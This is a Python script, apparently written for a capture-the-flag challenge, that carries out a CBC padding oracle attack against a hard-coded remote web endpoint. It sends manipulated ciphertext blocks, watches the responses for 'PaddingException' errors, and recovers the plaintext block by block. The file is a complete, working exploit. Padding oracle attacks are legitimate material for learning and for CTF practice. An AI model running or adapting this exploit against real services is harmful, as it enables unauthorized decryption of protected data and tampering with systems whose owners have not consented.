
import requests
from padding_oracle.padding_oracle import padding_oracle
from u.common import b64e, b64d
from u.utils import encrypt_data

def decrypt(data:memoryview) -> bytes:
    global iv, url
    data_to_send = iv + bytes(data)
    de = b64e(data_to_send)
    #r = requests.get(f'{url}?post={de}',  proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
    r = requests.get(f'{url}?post={de}',  allow_redirects=False)
    return r.text

def check_padding_error(d) -> bool:
    return type(d) is str and 'PaddingException' in d


if __name__ == '__main__':

    url = 'http://34.74.105.127/71a7d1053f/'

    hashi_ = encrypt_data(url, 'titulo', 'cuerpo')
    #hashi_ = b64d(coded_hash)
    iv = hashi_[:16]
    hash_ = hashi_[16:]

    print(iv.hex())
    print(hash_.hex())

    decrip = None
    for i in range(len(hash_), -1, -16):
        if i-32 < 0:
            c1 = iv
            c2 = hash_[:16]
        else:
            ini = i-32
            fin = ini+16
            c1 = hash_[ini:fin]
            c2 = hash_[fin:fin+16]
        des = padding_oracle(c1,c2, decrypt, check_padding_error)
        if not decrip:
            decrip = des
        else:
            decrip = des + decrip
        print(decrip.hex())
        try:
            print(decrip.decode('utf8'))        
        except Exception:
            pass
    print(decrip.decode('utf8'))